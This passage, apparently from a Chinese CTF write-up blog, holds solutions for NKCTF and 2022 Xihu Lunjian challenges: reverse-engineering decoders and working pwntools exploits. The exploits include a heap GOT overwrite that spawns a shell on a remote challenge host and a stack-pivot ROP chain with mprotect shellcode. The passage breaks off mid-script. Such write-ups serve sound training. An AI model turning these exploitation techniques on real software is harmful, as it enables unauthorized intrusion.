p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)))<br>    p.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><br><br><br>e=ELF(<span class="hljs-string">&#x27;./nk_note&#x27;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so&#x27;</span>)<br><br>p=remote(<span class="hljs-string">&quot;node2.yuzhian.com.cn:30946&quot;</span>)<br><span class="hljs-comment">#p=process(&quot;./nk_note&quot;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>show(<span class="hljs-number">16</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>pause()<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x500</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x300</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x40</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x20</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span><br>edit(<span class="hljs-number">16</span>,payload)<br>show(<span class="hljs-number">16</span>)<br>p.readuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>d1=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d1))<br>e.address=d1-<span class="hljs-number">0x4120</span><br><br>func=<span class="hljs-string">&#x27;puts&#x27;</span><br>func_got=e.got[func]<br><br><br>l=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x6B</span>):<br>    payload=<span class="hljs-string">&#x27;a&#x27;</span>*i*<span class="hljs-number">8</span><br>    edit(<span class="hljs-number">16</span>,payload)<br>    show(<span class="hljs-number">16</span>)<br>    data=p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).strip(<span class="hljs-string">b&#x27;a&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    dn=u64(data)<br>    l.append(dn)<br><br><span class="hljs-built_in">print</span>(l)<br>pause()<br>payload=flat(l)+p64(e.address+<span class="hljs-number">0x4150</span>)<br>edit(<span class="hljs-number">16</span>,payload)<br>ind=<span class="hljs-number">0x26</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.address))<br><br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x40</span>)<br><br>edit(<span class="hljs-number">5</span>,p64(func_got))<br>show(ind)<br>dd=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(dd))<br>libc.address=dd-libc.sym[func]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(<span class="hljs-number">5</span>,p64(e.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>edit(ind,p64(system))<br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="reverse">reverse</h1><h2 id="ez-baby-apk">ez_baby_apk</h2><p>使用jadx加雷电模拟器进行调试</p><p><img src="/img/blog_img/NKCTF/page_Image/png33.png" srcset="/img/loading.gif" lazyload alt=""></p><p><img src="/img/blog_img/NKCTF/page_Image/png34.png" srcset="/img/loading.gif" lazyload alt=""></p><p><img src="/img/blog_img/NKCTF/page_Image/png35.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="PMKF">PMKF</h2><p><img src="/img/blog_img/NKCTF/page_Image/png36.jpg" srcset="/img/loading.gif" lazyload alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-string">&quot;1122&quot;</span>,<span class="hljs-string">&quot;3322&quot;</span>,<span class="hljs-string">&quot;1223&quot;</span>,<span class="hljs-string">&quot;2211&quot;</span>,<span class="hljs-string">&quot;0111&quot;</span>,<span class="hljs-string">&quot;1101&quot;</span>,<span class="hljs-string">&quot;0000&quot;</span>,<span class="hljs-string">&quot;0101&quot;</span>,<span class="hljs-string">&quot;1211&quot;</span>,<span class="hljs-string">&quot;0111&quot;</span>,<span class="hljs-string">&quot;2223&quot;</span>,<span class="hljs-string">&quot;2330&quot;</span>,<span class="hljs-string">&quot;3323&quot;</span>,<span class="hljs-string">&quot;2211&quot;</span>,<span class="hljs-string">&quot;1112&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>]<br>e=[]<br>k=<span class="hljs-string">b&#x27;nkman&#x27;</span><br>k1=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> k:<br>    k1+=i<br>k1=k1&amp;<span class="hljs-number">0xff</span><br><span class="hljs-built_in">print</span>(k1)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    c=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> i:<br>        c+=<span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(j))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>)<br>    e.append(<span class="hljs-built_in">int</span>(c,<span class="hljs-number">2</span>)^k1)<br><span class="hljs-built_in">print</span>((<span class="hljs-string">b&#x27;\x05&#x27;</span>+<span class="hljs-string">b&#x27;nkman&#x27;</span>+<span class="hljs-built_in">bytes</span>(e)).<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure><h2 id="babyrust">babyrust</h2><p><img src="/img/blog_img/NKCTF/page_Image/png37.jpg" srcset="/img/loading.gif" lazyload alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">b&quot;)&amp;n_qFb&#x27;NZXpj)*bLDmLnVj]@^_H&quot;</span><br>e=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    d=(i-<span class="hljs-number">0x28</span>+<span class="hljs-number">45</span>)^<span class="hljs-number">0x30</span><br>    <span class="hljs-keyword">if</span> d&lt;<span class="hljs-number">0x20</span>:<br>        d=d+<span class="hljs-number">48</span><br>    e.append(d)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(e))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022西湖论剑-初赛</title>
    <link href="/page/wp/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bwp/"/>
    <url>/page/wp/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<h1 id="Reverse">Reverse</h1><h2 id="BabyRE">BabyRE</h2><p>程序先对输入的数据进行<code>base8</code>加密，并将加密后数据的<code>0x10~0x70</code>与<code>16230465152334621443147115031070150320711603206314033466154344611443406614230466156344661543046</code>比较<br>然后对加密后数据的<code>0~0x70</code>进行魔改过的<code>sha1</code>加密，并将哈希值与<code>67339fc92b4875b8c073c76994ef1ca4ce632d26</code>比较<br>最后将输入数据的<code>0x2a~0x30</code>作为密钥，对<code>base8</code>加密后数据的前<code>0x70</code>个字节进行<code>rc4</code>加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sha1 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> tqdm<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">data</span>):<br>    b=<span class="hljs-string">&quot;012345678&quot;</span><br>    bi=<span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        bi+=<span class="hljs-built_in">bin</span>(b.find(i))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">3</span>)<br><br>    bi=<span class="hljs-built_in">int</span>(bi,<span class="hljs-number">2</span>)<br>    bi=<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(bi)[<span class="hljs-number">2</span>:])<br>    <span class="hljs-keyword">return</span> bi<br><br>bi=decode(<span class="hljs-string">&quot;162304651523346214431471150310701503207116032063140334661543446114434066142304661563446615430464&quot;</span>)<br><span class="hljs-comment"># 915572239428449843076691286116796614</span><br>data=<span class="hljs-string">b&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params">data</span>):<br>    b=<span class="hljs-string">b&#x27;01234567&#x27;</span><br>    bi=<span class="hljs-string">&quot;&quot;</span><br>    odata=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>        bi+=<span class="hljs-built_in">bin</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(bi),<span class="hljs-number">3</span>):<br>        odata.append(b[<span class="hljs-built_in">int</span>(bi[j:j+<span class="hljs-number">3</span>],<span class="hljs-number">2</span>)])<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(odata)<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">for i in tqdm.tqdm(range(10**6)):</span><br><span class="hljs-string">    data=[]</span><br><span class="hljs-string">    for j in range(6):</span><br><span class="hljs-string">        data.append(0x30+(i%10))</span><br><span class="hljs-string">        i//=10</span><br><span class="hljs-string">    data=bytes(data)+bi</span><br><span class="hljs-string">    data=encode(data)</span><br><span class="hljs-string">    hash=sha1(data)</span><br><span class="hljs-string">    if hash==&quot;67339fc92b4875b8c073c76994ef1ca4ce632d26&quot;:</span><br><span class="hljs-string">        break</span><br><span class="hljs-string"># 561516</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>bi=<span class="hljs-string">b&quot;561516915572239428449843076691286116796614&quot;</span><br><br><br><br><br><br>endata=[<span class="hljs-number">0x3F</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x61</span>, \<br>  <span class="hljs-number">0x51</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x08</span>, \<br>  <span class="hljs-number">0x12</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x76</span>, \<br>  <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xDF</span>, \<br>  <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xF8</span>, \<br>  <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x11</span>, \<br>  <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xBD</span>, \<br>  <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x84</span>, \<br>  <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xC0</span>, \<br>  <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x3D</span>, \<br>  <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xDE</span>, \<br>  <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x70</span>];<br>bbi=encode(bi)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">GetKey</span>(<span class="hljs-params">data</span>):<br>    k=[]<br>    k1=[]<br>    data_l=<span class="hljs-built_in">len</span>(data)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        k.append(i)<br>        k1.append(data[i%data_l])<br>    n=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        n=(k1[i]+n+k[i])&amp;<span class="hljs-number">0xff</span><br>        n1=k[i]<br>        k[i]=k[n]<br>        k[n]=n1<br>    <span class="hljs-keyword">return</span> k<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Cipher</span>(<span class="hljs-params">data,key</span>):<br>    enc=[]<br>    k=key<br>    n=<span class="hljs-number">0</span><br>    n1=<span class="hljs-number">0</span><br>    tmp=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>        n=(n+<span class="hljs-number">1</span>)&amp;<span class="hljs-number">0xff</span><br>        n1=(n1+k[n])&amp;<span class="hljs-number">0xff</span><br>        tmp=k[n]<br>        k[n]=k[n1]<br>        k[n1]=tmp<br>        enc.append(data[i]^k[(k[n]+k[n1])%<span class="hljs-number">256</span>])<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(enc)<br><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> tqdm.tqdm(<span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>**<span class="hljs-number">6</span>)):<br>    data=[]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>        data.append(<span class="hljs-number">0x30</span>+(i%<span class="hljs-number">10</span>))<br>        i//=<span class="hljs-number">10</span><br>    data=<span class="hljs-built_in">bytes</span>(data)<br>    k=GetKey(data)<br>    edata=GetEnc(bbi,k)<br>    <span class="hljs-keyword">if</span> edata==endata:<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(bi+data)<br><span class="hljs-comment"># 561516915572239428449843076691286116796614807391</span><br></code></pre></td></tr></table></figure><h1 id="Pwn">Pwn</h1><h2 id="Message-Board">Message Board</h2><p><img src="/img/blog_img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-pwn-Message_Board.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"><br><code>main函数</code>中存在栈溢出，但只能溢出<code>0x10</code>个字节，只能修改<code>rbp</code>与<code>rip</code>的值，所以需要进行栈迁移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>,checksec=<span class="hljs-number">0</span>)<br>bss=e.bss(<span class="hljs-number">0x500</span>)+<span class="hljs-number">0xb0</span><br>context.binary=e<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>leave=<span class="hljs-number">0x4013a2</span><br>read=<span class="hljs-number">0x401378</span><br>rdi=<span class="hljs-number">0x0000000000401413</span><br>func=<span class="hljs-string">&#x27;puts&#x27;</span><br>func_got=e.got[func]<br>puts=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>p.send(<span class="hljs-string">b&#x27;rot-will&#x27;</span>)<br><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xb0</span>+p64(bss)+p64(read))<br>payload=p64(bss+<span class="hljs-number">0x100</span>)+p64(rdi)+p64(func_got)+p64(puts)+p64(read)<br>payload=payload.ljust(<span class="hljs-number">0xb0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+p64(bss-<span class="hljs-number">0xb0</span>)+p64(leave)<br>p.send(payload)<br>p.readuntil(<span class="hljs-string">&#x27;Successfully~\n&#x27;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>libc.address=d-libc.sym[func]<br>rsi=<span class="hljs-number">0x000000000002601f</span>+libc.address<br>rdx=<span class="hljs-number">0x0000000000142c92</span>+libc.address<br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>payload=p64(bss+<span class="hljs-number">0x200</span>)+p64(rdi)+p64(bss&amp;<span class="hljs-number">0xffff000</span>)+p64(rsi)+p64(<span class="hljs-number">0x100</span>)+p64(rdx)+p64(<span class="hljs-number">0x7</span>)+p64(mprotect)+p64(bss+<span class="hljs-number">0x100</span>-<span class="hljs-number">0xb0</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>)+p64(<span class="hljs-number">0</span>)<br>payload+=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>)+shellcraft.read(<span class="hljs-number">3</span>,bss-<span class="hljs-number">0xb0</span>,<span class="hljs-number">0x30</span>)+shellcraft.write(<span class="hljs-number">1</span>,bss-<span class="hljs-number">0xb0</span>,<span class="hljs-number">0x30</span>))<br>payload=payload.ljust(<span class="hljs-number">0xb0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(bss+<span class="hljs-number">0x100</span>-<span class="hljs-number">0xb0</span>)+p64(leave)<br><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="babycalc">babycalc</h2><p><img src="/img/blog_img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-pwn-babycalc.jpg" srcset="/img/loading.gif" lazyload alt="main函数代码" title="main函数代码"></p><p><img src="/img/blog_img/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-pwn-babycalc-1.jpg" srcset="/img/loading.gif" lazyload alt="vuln函数代码" title="vuln函数代码"></p><p><code>vuln函数</code>中可以向<code>buf变量</code>中写入<code>0x100</code>字节的数据，这里可以修改<code>i</code>的值，导致下面<code>*(&amp;v3+i)</code>索引到其他地址处，并且当输入<code>0x100</code>字节的数据时，会将<code>leave</code>恢复的<code>rbp</code>的值的最低字节变成<code>0x00</code>，在溢出之前，还需要通过验证<br>如果恢复的<code>rbp</code>的最低字节变成<code>0x00</code>时，恢复的<code>rbp</code>刚好位于<code>vuln函数</code>的栈空间中，这时执行一个<code>leave;ret</code>，就可以执行我们构造好的<code>rop链</code>，但这种情况属于偶然的，所以需要进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    验证</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>v3 =Int(<span class="hljs-string">&quot;v3&quot;</span>)<br>v4 =Int(<span class="hljs-string">&quot;v4&quot;</span>)<br>v5 =Int(<span class="hljs-string">&quot;v5&quot;</span>)<br>v6 =Int(<span class="hljs-string">&quot;v6&quot;</span>)<br>v7 =Int(<span class="hljs-string">&quot;v7&quot;</span>)<br>v8 =Int(<span class="hljs-string">&quot;v8&quot;</span>)<br>v9 =Int(<span class="hljs-string">&quot;v9&quot;</span>)<br>v10 =Int(<span class="hljs-string">&quot;v10&quot;</span>)<br>v11 =Int(<span class="hljs-string">&quot;v11&quot;</span>)<br>v12 =Int(<span class="hljs-string">&quot;v12&quot;</span>)<br>v13 =Int(<span class="hljs-string">&quot;v13&quot;</span>)<br>v14 =Int(<span class="hljs-string">&quot;v14&quot;</span>)<br>v15 =Int(<span class="hljs-string">&quot;v15&quot;</span>)<br>v16 =Int(<span class="hljs-string">&quot;v16&quot;</span>)<br>v17 =Int(<span class="hljs-string">&quot;v17&quot;</span>)<br>v18 =Int(<span class="hljs-string">&quot;v18&quot;</span>)<br>ns=[v3 ,v4 ,v5 ,v6 ,v7 ,v8 ,v9 ,v10,v11,v12,v13,v14,v15,v16,v17,v18]<br>s=Solver()<br>s.add(v5 * v4 * v3 - v6 == <span class="hljs-number">36182</span>)<br>s.add(v3 == <span class="hljs-number">19</span>)<br>s.add(v5 * <span class="hljs-number">19</span> * v4 + v6 == <span class="hljs-number">36322</span>)<br>s.add((v13 + v3 